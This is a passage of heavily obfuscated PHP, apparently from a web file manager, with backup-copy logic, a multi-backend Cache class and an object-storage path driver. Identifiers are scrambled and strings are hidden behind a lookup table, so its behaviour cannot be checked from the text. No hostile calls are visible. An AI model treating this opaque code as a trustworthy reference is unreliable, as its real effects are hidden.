strlen("\x7b\151\157\72{$ÚİÙîš±[$_SERVER[ĞÂ¤àÓï][824]]}\x7d")); if (IO::exist($–È¬Ş°á)) { $¸œø±Å°->updateFileEnd($ÚİÙîš±[$_SERVER[ĞÂ¤àÓï][32]], $ÚİÙîš±[$_SERVER[ĞÂ¤àÓï][76]]); } else { $–È¬Ş°á = get_path_father($–È¬Ş°á); IO::mkdir($–È¬Ş°á); if (!IO::copy($À²µùş†, $–È¬Ş°á, $_SERVER[ĞÂ¤àÓï][825])) { write_log($_SERVER[ĞÂ¤àÓï][826] . $À²µùş† . $_SERVER[ĞÂ¤àÓï][810] . $–È¬Ş°á . $_SERVER[ĞÂ¤àÓï][164], $_SERVER[ĞÂ¤àÓï][787]); $éÄÔ·äÕ = !1; break; } } $Ô×ü×Ó“ = $ÚİÙîš±[$_SERVER[ĞÂ¤àÓï][468]]; $ÈæÈóöÍ += 1; $½…”Ÿûğ += $ÚİÙîš±[$_SERVER[ĞÂ¤àÓï][76]]; $ºæÉĞ¥  += 1; $Œ“­®©– += $ÚİÙîš±[$_SERVER[ĞÂ¤àÓï][76]]; if ($½…”Ÿûğ >= 1024 * 1024 * 100) { $ç³ä¨˜ş = array($_SERVER[ĞÂ¤àÓï][827] => $Ô×ü×Ó“, $_SERVER[ĞÂ¤àÓï][828] => $ºæÉĞ¥ , $_SERVER[ĞÂ¤àÓï][829] => $Œ“­®©–); Backup::set($ç³ä¨˜ş); $½…”Ÿûğ = $ÈæÈóöÍ = 0; } } $óü…Üü¬ = count($Æ‡æ´´ì); $¥Ó‚ú®Ì++; } while ($óü…Üü¬ == $İ‘‰‡É); $¸œø±Å°->end(); $ç³ä¨˜ş = array($_SERVER[ĞÂ¤àÓï][830] => 1, $_SERVER[ĞÂ¤àÓï][497] => time(), $_SERVER[ĞÂ¤àÓï][774] => 1, $_SERVER[ĞÂ¤àÓï][827] => $Ô×ü×Ó“, $_SERVER[ĞÂ¤àÓï][819] => $Ü•·‰¡×, $_SERVER[ĞÂ¤àÓï][818] => $Ö”úÜËê, $_SERVER[ĞÂ¤àÓï][831] => time()); if ($ÈæÈóöÍ) { $ç³ä¨˜ş[$_SERVER[ĞÂ¤àÓï][828]] = $ºæÉĞ¥ ; $ç³ä¨˜ş[$_SERVER[ĞÂ¤àÓï][829]] = $Œ“­®©–; } Backup::set($ç³ä¨˜ş); $this->_fileFilter($÷£×Úš); return !0; } private function _fileExist($ÇªúÃ„ì, &$ï„ß…ğ’, $şÈ”…§Î) { $ÚÈÁ³„ª =& $_SERVER[ĞÂ¤àÓï]; $Ïê¡’ñ = $ÇªúÃ„ì[$ÚÈÁ³„ª[84]]; if (in_array($ÇªúÃ„ì[$ÚÈÁ³„ª[468]], $ï„ß…ğ’)) { return !1; } if (!in_array($ÇªúÃ„ì[$ÚÈÁ³„ª[824]], $şÈ”…§Î)) { return !1; } if (IO::exist($Ïê¡’ñ)) { return !0; } $şâ©æœ = get_path_father($Ïê¡’ñ); if (IO::exist($şâ©æœ)) { $ï„ß…ğ’[] = $ÇªúÃ„ì[$ÚÈÁ³„ª[468]]; return !1; } $‡œèÌ˜Á = array($ÚÈÁ³„ª[824] => $ÇªúÃ„ì[$ÚÈÁ³„ª[824]], $ÚÈÁ³„ª[84] => array($ÚÈÁ³„ª[383], "{$şâ©æœ}\x25")); $‚¡éÍñ = Model($ÚÈÁ³„ª[796])->where($‡œèÌ˜Á)->field($ÚÈÁ³„ª[469])->select(); $ï„ß…ğ’ = array_merge($ï„ß…ğ’, array_to_keyvalue($‚¡éÍñ, $ÚÈÁ³„ª[12], $ÚÈÁ³„ª[468])); return !1; } private function _fileFilter($ãıÒ½“µ) { $Ö´ê’£ù =& $_SERVER[ĞÂ¤àÓï]; if (empty($ãıÒ½“µ)) { return; } $È—ıêĞœ = array($Ö´ê’£ù[468] => array($Ö´ê’£ù[7], array_unique($ãıÒ½“µ))); $“ä›ìÕ = Model($Ö´ê’£ù[832])->where($È—ıêĞœ)->field($Ö´ê’£ù[402])->select(); foreach ($“ä›ìÕ as $ğò¸·ëÖ) { Model($Ö´ê’£ù[832])->remove($ğò¸·ëÖ[$Ö´ê’£ù[402]], !1); } } private function storeIds() { $‹½‡´¼æ =& $_SERVER[ĞÂ¤àÓï]; $²‹îíë­ = Model($‹½‡´¼æ[766])->listData(); $âŞÇö‘Û = array(); $İÄŠŞÌÃ = $GLOBALS[$‹½‡´¼æ[6]][$‹½‡´¼æ[89]][$‹½‡´¼æ[833]]; foreach ($²‹îíë­ as $­À„¨ÌÅ) { $ŒàùôÇ‡ = strtolower($­À„¨ÌÅ[$‹½‡´¼æ[95]]); if (!isset($İÄŠŞÌÃ[$ŒàùôÇ‡])) { continue; } $‡Ùä´í = $‹½‡´¼æ[74] . (isset($İÄŠŞÌÃ[$ŒàùôÇ‡]) ? $İÄŠŞÌÃ[$ŒàùôÇ‡] : ucfirst($ŒàùôÇ‡)); if (!class_exists($‡Ùä´í)) { continue; } $âŞÇö‘Û[] = $­À„¨ÌÅ[$‹½‡´¼æ[399]]; } return $âŞÇö‘Û; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $­…ê…¸® =& $_SERVER[ĞÂ¤àÓï]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $µÂïÊµÆ = $GLOBALS[$­…ê…¸®[6]][$­…ê…¸®[349]]; $´ª„ùäş = $µÂïÊµÆ[$µÂïÊµÆ[$­…ê…¸®[834]]]; $âØåİÈ° = $µÂïÊµÆ[$­…ê…¸®[835]]; switch ($µÂïÊµÆ[$­…ê…¸®[834]]) { case $­…ê…¸®[21]: self::$handle = Model($­…ê…¸®[836]); break; case $­…ê…¸®[837]: self::$handle = new CacheRedis($´ª„ùäş, $âØåİÈ°); break; case $­…ê…¸®[838]: self::$handle = new CacheMemcached($´ª„ùäş, $âØåİÈ°); break; case $­…ê…¸®[199]: self::$handle = new CacheFile($´ª„ùäş, $âØåİÈ°); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ƒÂÑŞ™) { if (is_array($ƒÂÑŞ™) || is_object($ƒÂÑŞ™)) { $ƒÂÑŞ™ = json_encode($ƒÂÑŞ™); } $ƒÂÑŞ™ = rawurlencode($ƒÂÑŞ™); return md5(KOD_SITE_ID . $_SERVER[ĞÂ¤àÓï][11] . $ƒÂÑŞ™); } public static function get($˜ìÅÌ…À, $ã¶Ùæûí = false) { $õæş•Ûç = self::key($˜ìÅÌ…À); if ($ã¶Ùæûí) { return unserialize(self::init()->get($õæş•Ûç)); } if (!isset(self::$memoryCache[$õæş•Ûç])) { $å·¢‡ö¬ = self::init()->get($õæş•Ûç); self::$memoryCache[$õæş•Ûç] = unserialize($å·¢‡ö¬); } return self::$memoryCache[$õæş•Ûç]; } public static function set($ªÙêàÎÉ, $Ÿß¿Ìáˆ, $¹€¯Ï„ = false) { $…æ¹¹ = self::key($ªÙêàÎÉ); if (isset(self::$memoryCache[$…æ¹¹]) && self::$memoryCache[$…æ¹¹] === $Ÿß¿Ìáˆ) { return !0; } if ($¹€¯Ï„ === 0) { self::$memoryCache[$…æ¹¹] = $Ÿß¿Ìáˆ; return !0; } CacheLock::lock($ªÙêàÎÉ); $ğıİ¢¿¯ = self::init()->set($…æ¹¹, serialize($Ÿß¿Ìáˆ), $¹€¯Ï„); self::$memoryCache[$…æ¹¹] = $Ÿß¿Ìáˆ; CacheLock::unlock($ªÙêàÎÉ); return $ğıİ¢¿¯; } public static function getCall($Šüìæ†´, $à¤Å¹ë™, $—ıƒõ¹¦, $œ¬ÄóËÙ = array()) { $ôúÚùõÅ =& $_SERVER[ĞÂ¤àÓï]; $ÀÄÕö = self::get($Šüìæ†´); if ($ÀÄÕö || $ÀÄÕö === $ôúÚùõÅ[12]) { return $ÀÄÕö; } $ÀÄÕö = call_user_func_array($—ıƒõ¹¦, $œ¬ÄóËÙ); $ÀÄÕö = $ÀÄÕö ? $ÀÄÕö : $ôúÚùõÅ[12]; self::set($Šüìæ†´, $ÀÄÕö, $à¤Å¹ë™); return $ÀÄÕö; } public static function remove($•ƒ¾û»×) { $÷ª—î¨Ò = self::key($•ƒ¾û»×); unset(self::$memoryCache[$÷ª—î¨Ò]); self::clearTimeout(); CacheLock::lock($•ƒ¾û»×); $˜İù¡­ë = self::init()->remove($÷ª—î¨Ò); CacheLock::unlock($•ƒ¾û»×); return $˜İù¡­ë; } public static function removeMemory($ÎÜšü¶§) { $é¥ª×¸ = self::key($ÎÜšü¶§); unset(self::$memoryCache[$é¥ª×¸]); } public static function clearMemory($æêÇú» = false) { if ($æêÇú») { $æêÇú» = self::key($æêÇú»); unset(self::$memoryCache[$æêÇú»]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ĞÂ¤àÓï][839])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ĞÂ¤àÓï][840])) { self::init()->clearTimeout(); } } } goto fŒŠ“ğê¿¤; cµïò‘¦ª–: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($Ìõ³¼¥á) { parent::__construct(); include_once SDK_DIR . $_SERVER[ĞÂ¤àÓï][1392]; $this->_init($Ìõ³¼¥á); } public function _init($¾¬ÏøËÊ) { $¦ËÜî =& $_SERVER[ĞÂ¤àÓï]; foreach ($¾¬ÏøËÊ as $ŠÑãĞ²¨ => $®¸£üÜø) { if (isset($this->{$ŠÑãĞ²¨})) { $this->{$ŠÑãĞ²¨} = $®¸£üÜø; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¦ËÜî[1393] . LNG($¦ËÜî[1394])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Ö°ÕæåÎ =& $_SERVER[ĞÂ¤àÓï]; $Âóó©©Ü = new OSS\Model\CorsConfig(); $¾‹Üß¦Ï = new OSS\Model\CorsRule(); $¾‹Üß¦Ï->addAllowedOrigin($Ö°ÕæåÎ[1395]); $¾‹Üß¦Ï->addAllowedMethod($Ö°ÕæåÎ[1396]); $¾‹Üß¦Ï->addAllowedMethod($Ö°ÕæåÎ[1397]); $¾‹Üß¦Ï->addAllowedMethod($Ö°ÕæåÎ[1398]); $¾‹Üß¦Ï->addAllowedMethod($Ö°ÕæåÎ[1399]); $¾‹Üß¦Ï->addAllowedMethod($Ö°ÕæåÎ[160]); $¾‹Üß¦Ï->setMaxAgeSeconds(600); $¾‹Üß¦Ï->addExposeHeader($Ö°ÕæåÎ[1400]); $¾‹Üß¦Ï->addAllowedHeader($Ö°ÕæåÎ[1395]); $Âóó©©Ü->addRule($¾‹Üß¦Ï); try { $this->client->putBucketCors($this->bucket, $Âóó©©Ü); } catch (OSS\Core\OssException $¹ç‹›‡…) { return !1; } return !0; } public function getBucketCors() { $³İÙŸÕ€ =& $_SERVER[ĞÂ¤àÓï]; $¤«ö…òÑ = null; try { $¤«ö…òÑ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $±ğ¯Îšú) { return null; } if (!$¤«ö…òÑ || !($…£‹Åà° = $¤«ö…òÑ->getRules())) { return null; } $Öì¥ öÚ = $…£‹Åà°[0]->getAllowedOrigins(); $Ò‡×™¾“ = $…£‹Åà°[0]->getAllowedMethods(); $Ú¿­ê´ˆ = $…£‹Åà°[0]->getMaxAgeSeconds(); $‰¸ı¶õÄ = $…£‹Åà°[0]->getExposeHeaders(); $¦íÔÙÂ† = $…£‹Åà°[0]->getAllowedHeaders(); return array($³İÙŸÕ€[187] => isset($Öì¥ öÚ[0]) ? $Öì¥ öÚ[0] : $³İÙŸÕ€[12], $³İÙŸÕ€[191] => $Ò‡×™¾“, $³İÙŸÕ€[1401] => $Ú¿­ê´ˆ, $³İÙŸÕ€[1402] => isset($‰¸ı¶õÄ[0]) ? $‰¸ı¶õÄ[0] : $³İÙŸÕ€[12], $³İÙŸÕ€[189] => isset($¦íÔÙÂ†[0]) ? $¦íÔÙÂ†[0] : $³İÙŸÕ€[12]); } public function isBucketCors() { $êïË‚İ¬ =& $_SERVER[ĞÂ¤àÓï]; $§Ì”¤á = $this->getBucketCors(); if (!$§Ì”¤á || !is_array($§Ì”¤á)) { return !1; } if ($§Ì”¤á[$êïË‚İ¬[187]] != $êïË‚İ¬[188] || $§Ì”¤á[$êïË‚İ¬[189]] != $êïË‚İ¬[188]) { return !1; } $Ù«úØ¸ø = array_map($êïË‚İ¬[190], $§Ì”¤á[$êïË‚İ¬[191]]); if (!is_array($Ù«úØ¸ø)) { $Ù«úØ¸ø = array(); } $ŒŞëâïã = array($êïË‚İ¬[192], $êïË‚İ¬[193], $êïË‚İ¬[194], $êïË‚İ¬[195], $êïË‚İ¬[196]); $şÇù­ = array_diff($ŒŞëâïã, $Ù«úØ¸ø); return empty($şÇù­); } public function mkfile($—¼ß¢ÚÃ, $§½ØûîÚ = '', $‹Î±ºÄü = REPEAT_RENAME) { $À“ô ó = $this->setContent($—¼ß¢ÚÃ, $§½ØûîÚ); if ($À“ô ó !== !1) { return $this->getPathOuter($—¼ß¢ÚÃ); } return !1; } public function mkdir($÷›˜¥ÊÂ, $ø¤œ®Ş· = REPEAT_SKIP) { if ($ø¤œ®Ş· && $this->_isFolder($÷›˜¥ÊÂ)) { return $this->getPathOuter($÷›˜¥ÊÂ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($÷›˜¥ÊÂ)); } catch (OSS\Core\OssException $Êñ²ä¾) { return !1; } return $this->getPathOuter($÷›˜¥ÊÂ); } private function fileList($Ä³ÊõÈ, $‘Â“ õ– = '', $¸ì¡Şö = 0) { $§¬ôñ²Ü =& $_SERVER[ĞÂ¤àÓï]; $Ä³ÊõÈ = trim($Ä³ÊõÈ, $§¬ôñ²Ü[8]); $ı¿¾æĞ = empty($Ä³ÊõÈ) && $Ä³ÊõÈ !== $§¬ôñ²Ü[197] ? $§¬ôñ²Ü[12] : $Ä³ÊõÈ . $§¬ôñ²Ü[8]; $ô–ÁÚúƒ = $§¬ôñ²Ü[12]; $”»ãÌºé = 1000; $Ëë¶ÊÌß = $•Ëóâ—® = array(); while (!0) { check_abort(); $œœù¶õƒ = array($§¬ôñ²Ü[1403] => $‘Â“ õ–, $§¬ôñ²Ü[1404] => $ı¿¾æĞ, $§¬ôñ²Ü[1405] => $”»ãÌºé, $§¬ôñ²Ü[1406] => $ô–ÁÚúƒ); try { $„æÁ÷÷ = $this->client->listObjects($this->bucket, $œœù¶õƒ); } catch (OSS\Core\OssException $Óòü˜±Š) { break; } $ô–ÁÚúƒ = $„æÁ÷÷->getNextMarker(); $¤šñšıÅ = $„æÁ÷÷->getObjectList(); $ÆšŒÀ¶å = $„æÁ÷÷->getPrefixList(); foreach ($¤šñšıÅ as $æ¨Ç„Íœ) { if ($æ¨Ç„Íœ->getKey() == $ı¿¾æĞ) { continue; } $Ÿ†Şí¶° = $æ¨Ç„Íœ->getKey(); $Šéğ¨À½ = $æ¨Ç„Íœ->getSize(); $î³×çƒº = $æ¨Ç„Íœ->getLastModified(); $¨ğİ“ğ‹ = $¸ì¡Şö ? array($§¬ôñ²Ü[32] => $Ÿ†Şí¶°, $§¬ôñ²Ü[76] => $Šéğ¨À½, $§¬ôñ²Ü[203] => strtotime($î³×çƒº)) : $Ÿ†Şí¶°; $¦Ø²Ğ¢‹ = $Šéğ¨À½ == 0 && substr($Ÿ†Şí¶°, strlen($Ÿ†Şí¶°) - 1, 1) == $§¬ôñ²Ü[8] ? !0 : !1; $Õƒşõ = array($§¬ôñ²Ü[76] => $Šéğ¨À½, $§¬ôñ²Ü[1407] => $Šéğ¨À½, $§¬ôñ²Ü[85] => strtotime($î³×çƒº), $§¬ôñ²Ü[1408] => $î³×çƒº); $this->cacheMethodInfoSet($Ÿ†Şí¶°, $¦Ø²Ğ¢‹, $Õƒşõ); if ($¦Ø²Ğ¢‹) { $Ëë¶ÊÌß[] = $Ÿ†Şí¶°; continue; } $•Ëóâ—®[] = $¨ğİ“ğ‹; } foreach ($ÆšŒÀ¶å as $ÒÔ”¸û›) { $Ëë¶ÊÌß[] = $ÒÔ”¸û›->getPrefix(); $this->cacheMethodInfoSet($ÒÔ”¸û›->getPrefix(), !0); } if ($ô–ÁÚúƒ === $§¬ôñ²Ü[12]) { break; } } $this->cacheMethodInfoSet($Ä³ÊõÈ, !0); return array($§¬ôñ²Ü[82] => $Ëë¶ÊÌß, $§¬ôñ²Ü[83] => $•Ëóâ—®); } public function copyFile($‘…â½Ú, $¢Ã‡ÉßÌ) { $ÚÍ‡©‰Ó = $this->size($‘…â½Ú); if ($ÚÍ‡©‰Ó < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $‘…â½Ú, $this->bucket, $this->pathEncode($¢Ã‡ÉßÌ)); } catch (OSS\Core\OssException $ğäÆ¹’Ó) { return !1; } return $this->getPathOuter($¢Ã‡ÉßÌ); } $Çñ™à•Œ = $this->multiCopyObject($‘…â½Ú, $¢Ã‡ÉßÌ, $ÚÍ‡©‰Ó); return $Çñ™à•Œ ? $this->getPathOuter($¢Ã‡ÉßÌ) : !1; } private function multiCopyObject($ïÉ†üÜ‹, $Œ‚èŒœè, $ï©ÜÓíş) { $íÈºâß =& $_SERVER[ĞÂ¤àÓï]; try { $ˆÊÕ³Ší = array(); if ($É¬·£¼Š = $this->hashMd5($ïÉ†üÜ‹)) { $ˆÊÕ³Ší = array(OSS\OssClient::OSS_HEADERS => array($íÈºâß[1409] => $É¬·£¼Š)); } $ êŞó¼Ä = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Œ‚èŒœè), $ˆÊÕ³Ší); $ªœÌñÈĞ = 1; $êáì¼¤Ä = 0; $¬î›‰ = array(); $Õ÷ñØ‚ = 1024 * 1024 * 10; $ÄÓÓóÖı = $this->client->generateMultiuploadParts($ï©ÜÓíş, $Õ÷ñØ‚); foreach ($ÄÓÓóÖı as $­¼‡¶Ëñ => $ÍÅß…Ô™) { $‚À²Ô˜ = $êáì¼¤Ä + (int) $ÍÅß…Ô™[$íÈºâß[1410]]; $ÃÒ²ú‰ = (int) $ÍÅß…Ô™[$íÈºâß[337]] + $‚À²Ô˜ - 1; $÷“¹ìç = array($íÈºâß[1411] => $‚À²Ô˜, $íÈºâß[1412] => $ÃÒ²ú‰); $¬î›‰[] = $this->client->uploadPartCopy($this->bucket, $ïÉ†üÜ‹, $this->bucket, $this->pathEncode($Œ‚èŒœè), $ªœÌñÈĞ, $ êŞó¼Ä, $÷“¹ìç); $ªœÌñÈĞ = $ªœÌñÈĞ + 1; } $ş»ø²¯× = array(); foreach ($¬î›‰ as $­¼‡¶Ëñ => $±á½¾Ú) { $ş»ø²¯×[] = array($íÈºâß[1413] => $­¼‡¶Ëñ + 1, $íÈºâß[1414] => $±á½¾Ú); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Œ‚èŒœè), $ êŞó¼Ä, $ş»ø²¯×); } catch (OSS\Core\OssException $àà»Äå´) { return !1; } return !0; } public function moveFile($¦ÂŠãçù, $íÍ¼Ñª¨) { if ($this->copyFile($¦ÂŠãçù, $íÍ¼Ñª¨)) { $this->remove($¦ÂŠãçù); return $this->getPathOuter($íÍ¼Ñª¨); } return !1; } public function delFile($€©°Åø–) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($€©°Åø–)); } catch (OSS\Core\OssException $áäÍ¡¹­) { return !1; } return !0; } public function delFolder($¢ë»³ë) { $ıáº¿«á =& $_SERVER[ĞÂ¤àÓï]; if (!$this->exist($¢ë»³ë)) { return !0; } $this->listItemCache = !1; $¬ÏÈ = $this->fileList($¢ë»³ë); $this->listItemCache = !0; $¤Á¾íù = trim($¢ë»³ë, $ıáº¿«á[8]) . $ıáº¿«á[8]; if (!empty($¢ë»³ë) && $¢ë»³ë !== $ıáº¿«á[197] && !in_array($¤Á¾íù, $¬ÏÈ[$ıáº¿«á[82]])) { $¬ÏÈ[$ıáº¿«á[82]][] = $¤Á¾íù; } $›ãı¾ªÕ = $this->delByBatch($¬ÏÈ[$ıáº¿«á[83]]); if (!$›ãı¾ªÕ) { return !1; } $›ãı¾ªÕ = $this->delByBatch($¬ÏÈ[$ıáº¿«á[82]]); if (!$›ãı¾ªÕ) { return !1; } return $this->delFile($¤Á¾íù); } private function delByBatch($ß¹‰§Á„) { foreach (array_chunk($ß¹‰§Á„, 1000) as $æèÒÆ„ş) { try { $this->client->deleteObjects($this->bucket, $æèÒÆ„ş); } catch (OSS\Core\OssException $ìıÎùçª) { return !1; } } return !0; } public function rename($”ïÂÚœÒ, $’ÙËÇ) { return $this->renameObject($”ïÂÚœÒ, $’ÙËÇ); } private function fileInfo($Ìïªñş…, $Šˆú—®ü = false, $›ôˆëÉï = array()) { $ş²˜Í›” =& $_SERVER[ĞÂ¤àÓï]; $è×ãì°† = array($ş²˜Í›”[32] => $this->pathThis($Ìïªñş…), $ş²˜Í›”[84] => $this->getPathOuter($Ìïªñş…), $ş²˜Í›”[33] => $ş²˜Í›”[199], $ş²˜Í›”[76] => isset($›ôˆëÉï[$ş²˜Í›”[76]]) ? $›ôˆëÉï[$ş²˜Í›”[76]] : 0, $ş²˜Í›”[174] => $this->ext($Ìïªñş…)); if ($Šˆú—®ü) { return $è×ãì°†; } $è×ãì°†[$ş²˜Í›”[200]] = $è×ãì°†[$ş²˜Í›”[85]] = 0; $è×ãì°†[$ş²˜Í›”[201]] = $è×ãì°†[$ş²˜Í›”[202]] = !0; if (empty($›ôˆëÉï)) { $ÌŠÂ·µ× = $this->objectMeta($Ìïªñş…); if (!$ÌŠÂ·µ×) { return $è×ãì°†; } $›ôˆëÉï = array($ş²˜Í›”[85] => strtotime($ÌŠÂ·µ×[$ş²˜Í›”[1408]]), $ş²˜Í›”[76] => $ÌŠÂ·µ×[$ş²˜Í›”[1407]] + 0); } if (isset($›ôˆëÉï[$ş²˜Í›”[76]])) { $è×ãì°†[$ş²˜Í›”[76]] = $›ôˆëÉï[$ş²˜Í›”[76]]; } if (isset($›ôˆëÉï[$ş²˜Í›”[85]])) { $è×ãì°†[$ş²˜Í›”[85]] = $›ôˆëÉï[$ş²˜Í›”[85]]; } if (isset($›ôˆëÉï[$ş²˜Í›”[203]]) && !trim($è×ãì°†[$ş²˜Í›”[85]])) { $è×ãì°†[$ş²˜Í›”[85]] = $›ôˆëÉï[$ş²˜Í›”[203]]; } return $è×ãì°†; } private function folderInfo($ÈÙêã‰, $­ƒîÁÔ = false, $ƒç×«Õ = array()) { $–ı‹ø˜Ù =& $_SERVER[ĞÂ¤àÓï]; $ºÜ–„áé = array($–ı‹ø˜Ù[32] => $this->pathThis($ÈÙêã‰), $–ı‹ø˜Ù[84] => $this->getPathOuter($–ı‹ø˜Ù[8] . $ÈÙêã‰), $–ı‹ø˜Ù[33] => $–ı‹ø˜Ù[75]); if ($­ƒîÁÔ) { return $ºÜ–„áé; } $ºÜ–„áé[$–ı‹ø˜Ù[200]] = $ºÜ–„áé[$–ı‹ø˜Ù[85]] = 0; $ºÜ–„áé[$–ı‹ø˜Ù[201]] = $ºÜ–„áé[$–ı‹ø˜Ù[202]] = !0; if (empty($ƒç×«Õ)) { $ÈÙêã‰ = rtrim($ÈÙêã‰, $–ı‹ø˜Ù[8]) . $–ı‹ø˜Ù[8]; $×¯¾¥ = $this->objectMeta($ÈÙêã‰); if (!$×¯¾¥) { return $ºÜ–„áé; } $ƒç×«Õ = array($–ı‹ø˜Ù[200] => $×¯¾¥[$–ı‹ø˜Ù[511]][$–ı‹ø˜Ù[1415]], $–ı‹ø˜Ù[85] => strtotime($×¯¾¥[$–ı‹ø˜Ù[1408]])); } if (isset($ƒç×«Õ[$–ı‹ø˜Ù[85]])) { $ºÜ–„áé[$–ı‹ø˜Ù[85]] = $ƒç×«Õ[$–ı‹ø˜Ù[85]]; } if (isset($ƒç×«Õ[$–ı‹ø˜Ù[200]])) { $ºÜ–„áé[$–ı‹ø˜Ù[200]] = $ƒç×«Õ[$–ı‹ø˜Ù[200]]; } return $ºÜ–„áé; } public function listPath($ƒ›©Éşø, $îêì¶Ÿ  = false) { $Ñ«è©§  =& $_SERVER[ĞÂ¤àÓï]; $£Ú“óİ = $this->fileList($ƒ›©Éşø, $Ñ«è©§ [8], !0); foreach ($£Ú“óİ[$Ñ«è©§ [82]] as $¿İœ¢¥ı => $ß·ĞşŸ†) { $£Ú“óİ[$Ñ«è©§ [82]][$¿İœ¢¥ı] = $this->folderInfo($ß·ĞşŸ†, $îêì¶Ÿ , $ß·ĞşŸ†); } foreach ($£Ú“óİ[$Ñ«è©§ [83]] as $¿İœ¢¥ı => $ß·ĞşŸ†) { $£Ú“óİ[$Ñ«è©§ [83]][$¿İœ¢¥ı] = $this->fileInfo($ß·ĞşŸ†[$Ñ«è©§ [32]], $îêì¶Ÿ , $ß·ĞşŸ†); } return $£Ú“óİ; } protected function infoChildren($ÏÁö ŞÎ, &$©ŸÍÄğ¦) { $‚§ÒÁ¼ =& $_SERVER[ĞÂ¤àÓï]; $õ§´’¡ = $this->fileList($ÏÁö ŞÎ, $‚§ÒÁ¼[12], !0); $©ŸÍÄğ¦[$‚§ÒÁ¼[78]] += count($õ§´’¡[$‚§ÒÁ¼[82]]); $©ŸÍÄğ¦[$‚§ÒÁ¼[77]] += count($õ§´’¡[$‚§ÒÁ¼[83]]); foreach ($õ§´’¡[$‚§ÒÁ¼[83]] as $Ğ³¨‚‹) { if (!$Ğ³¨‚‹ || !$Ğ³¨‚‹[$‚§ÒÁ¼[76]]) { continue; } $©ŸÍÄğ¦[$‚§ÒÁ¼[76]] += $Ğ³¨‚‹[$‚§ÒÁ¼[76]]; } } public function has($††œÃ×°, $ÂÂ±Ò± = false, $Å„†Ç¬Ğ = true) { $¹ÉíÊƒì =& $_SERVER[ĞÂ¤àÓï]; $††œÃ×° = trim($††œÃ×°, $¹ÉíÊƒì[8]); $ÈëÀîŞú = empty($††œÃ×°) && $††œÃ×° !== $¹ÉíÊƒì[197] ? $¹ÉíÊƒì[12] : $††œÃ×° . $¹ÉíÊƒì[8]; $ñÑÙğŞ÷ = $¹ÉíÊƒì[12]; $ ´¤€ôÔ = 500; $•“Óé½é = $Ã×ĞÎŞŠ = 0; while (!0) { check_abort(); $ïÀäÔã = array($¹ÉíÊƒì[1403] => $¹ÉíÊƒì[8], $¹ÉíÊƒì[1404] => $ÈëÀîŞú, $¹ÉíÊƒì[1405] => $ ´¤€ôÔ, $¹ÉíÊƒì[1406] => $ñÑÙğŞ÷); try { $ºÆÒñæÖ = $this->client->listObjects($this->bucket, $ïÀäÔã); } catch (OSS\Core\OssException $¥¨ÀÑİÛ) { break; } $ñÑÙğŞ÷ = $ºÆÒñæÖ->getNextMarker(); $›ÊİÜ = $ºÆÒñæÖ->getObjectList(); $©Âöêâ = $ºÆÒñæÖ->getPrefixList(); if ($ÂÂ±Ò±) { if (count($›ÊİÜ) > 1 || count($›ÊİÜ) == 1 && $›ÊİÜ[0]->getKey() != $ÈëÀîŞú) { $•“Óé½é += count($›ÊİÜ) - 1; } if (!empty($©Âöêâ)) { $Ã×ĞÎŞŠ += count($©Âöêâ); } if ($ñÑÙğŞ÷ === $¹ÉíÊƒì[12]) { break; } continue; } if ($Å„†Ç¬Ğ) { if (!empty($›ÊİÜ)) { if (count($›ÊİÜ) > 1 || $›ÊİÜ[0]->getKey() != $ÈëÀîŞú) { return !0; } } } else { if (!empty($©Âöêâ)) { return !0; } } if ($ñÑÙğŞ÷ === $¹ÉíÊƒì[12]) { break; } } if ($ÂÂ±Ò±) { return array($¹ÉíÊƒì[207] => $•“Óé½é, $¹ÉíÊƒì[208] => $Ã×ĞÎŞŠ); } return !1; } public function listAll($˜ÒÀã) { $Ì»³¿ü½ =& $_SERVER[ĞÂ¤àÓï]; $œ‹®‘ï = $this->fileList($˜ÒÀã, $Ì»³¿ü½[12], !0); $í¨²ŠÂé = array(); foreach ($œ‹®‘ï[$Ì»³¿ü½[83]] as $ÛâÍ½®) { $í¨²ŠÂé[$ÛâÍ½®[$Ì»³¿ü½[32]]] = $ÛâÍ½®[$Ì»³¿ü½[76]]; } foreach ($œ‹®‘ï[$Ì»³¿ü½[82]] as $ÛâÍ½®) { if (is_string($ÛâÍ½®)) { $í¨²ŠÂé[$ÛâÍ½®] = 0; } } return $this->listAllFiles($˜ÒÀã, array_keys($í¨²ŠÂé), $í¨²ŠÂé); } public function canRead($Á¸ÏÉåæ) { $üÓ¯°óœ =& $_SERVER[ĞÂ¤àÓï]; $´öä®‘’ = $this->pathAcl($Á¸ÏÉåæ); return $´öä®‘’ == $üÓ¯°óœ[1416] || $´öä®‘’ == $üÓ¯°óœ[556] ? !0 : !1; } public function canWrite($Ä–Øß±) { $ÆøŠèÒï = $this->pathAcl($Ä–Øß±); return $ÆøŠèÒï == $_SERVER[ĞÂ¤àÓï][556] ? !0 : !1; } public function pathAcl($ğô¼‰‘£) { $€è²’ÌÎ =& $_SERVER[ĞÂ¤àÓï]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $œèÆÒæ¤ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ğô¼‰‘£)); } catch (OSS\Core\OssException $‡øÙ‘åÜ) { return !1; } $ŸÄ”é±ş = $œèÆÒæ¤ == $€è²’ÌÎ[37] ? $this->bucketAcl : $œèÆÒæ¤; if ($ŸÄ”é±ş == $€è²’ÌÎ[1417]) 